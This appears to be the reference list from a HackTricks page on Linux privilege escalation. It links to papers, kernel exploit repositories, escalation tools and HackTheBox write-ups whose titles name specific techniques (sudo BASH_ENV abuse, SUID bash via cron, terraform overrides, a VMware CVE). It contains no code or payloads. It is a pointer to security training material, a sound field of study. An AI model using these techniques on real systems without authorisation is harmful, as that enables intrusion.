- [https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744](https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744)
- [http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html](http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html)
- [https://touhidshaikh.com/blog/?p=827](https://touhidshaikh.com/blog/?p=827)
- [https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf](https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf)
- [https://github.com/frizb/Linux-Privilege-Escalation](https://github.com/frizb/Linux-Privilege-Escalation)
- [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits)
- [https://github.com/rtcrowley/linux-private-i](https://github.com/rtcrowley/linux-private-i)
- [https://www.linux.com/news/what-socket/](https://www.linux.com/news/what-socket/)
- [https://muzec0318.github.io/posts/PG/peppo.html](https://muzec0318.github.io/posts/PG/peppo.html)
- [https://www.linuxjournal.com/article/7744](https://www.linuxjournal.com/article/7744)
- [https://blog.certcube.com/suid-executables-linux-privilege-escalation/](https://blog.certcube.com/suid-executables-linux-privilege-escalation/)
- [https://juggernaut-sec.com/sudo-part-2-lpe](https://juggernaut-sec.com/sudo-part-2-lpe)
- [https://linuxconfig.org/how-to-manage-acls-on-linux](https://linuxconfig.org/how-to-manage-acls-on-linux)
- [https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)
- [https://www.linode.com/docs/guides/what-is-systemd/](https://www.linode.com/docs/guides/what-is-systemd/)
- [0xdf – HTB Eureka (bash arithmetic injection via logs, overall chain)](https://0xdf.gitlab.io/2025/08/30/htb-eureka.html)
- [GNU Bash Manual – BASH_ENV (non-interactive startup file)](https://www.gnu.org/software/bash/manual/bash.html#index-BASH_005fENV)
- [0xdf – HTB Environment (sudo env_keep BASH_ENV → root)](https://0xdf.gitlab.io/2025/09/06/htb-environment.html)
- [0xdf – HTB Previous (sudo terraform dev_overrides + TF_VAR symlink privesc)](https://0xdf.gitlab.io/2026/01/10/htb-previous.html)
- [0xdf – HTB Slonik (pg_basebackup cron copy → SUID bash)](https://0xdf.gitlab.io/2026/02/12/htb-slonik.html)
- [NVISO – You name it, VMware elevates it (CVE-2025-41244)](https://blog.nviso.eu/2025/09/29/you-name-it-vmware-elevates-it-cve-2025-41244/)

{{#include ../../banners/hacktricks-training.md}}
